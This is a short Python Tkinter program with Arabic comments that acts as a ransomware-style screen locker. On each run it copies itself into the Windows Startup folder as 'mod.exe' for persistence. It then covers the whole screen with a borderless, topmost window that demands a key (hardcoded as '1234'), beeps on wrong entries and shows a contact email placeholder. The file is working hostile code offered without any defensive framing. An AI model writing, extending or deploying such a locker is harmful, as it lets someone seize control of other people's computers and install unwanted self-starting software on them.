import tkinter as tk
from tkinter import messagebox
import winsound
from PIL import Image, ImageTk
import os
import sys
import shutil

# نسخ التطبيق إلى مجلد بدء التشغيل
path_app = os.path.abspath(sys.argv[0])
run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
name = os.path.join(run_start, "mod.exe")

if not os.path.exists(name):
    shutil.copy(path_app, name)

def exit_app():
    root.destroy()

def clos():
    key = "1234"
    if entry.get() == key:
        exit_app()
    else:
        winsound.Beep(1000, 1000)  # قلّل المدة للراحة
        messagebox.showerror("خطأ", "كلمة المرور غير صحيحة")

root = tk.Tk()
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.config(background="green")

tk.Label(root, text="Enter The Key :", bg="green", fg="white").pack()
entry = tk.Entry(root, width=50, bd=0)
entry.pack()
b = tk.Button(root, text="Login", command=clos)
b.pack()

# تحميل الصورة
image_path = "img.jpg"
if os.path.exists(image_path):
    img = Image.open(image_path)
    photo = ImageTk.PhotoImage(img)
    tk.Label(root, image=photo, borderwidth=0, highlightthickness=0).pack()

# إيميل وهمي كمثال
tk.Label(root, text="example@gmail.com", bg="green", fg="white").place(x=(root.winfo_screenmmwidth() // 2) - 50, y=600)

root.resizable(False, False)
root.mainloop()
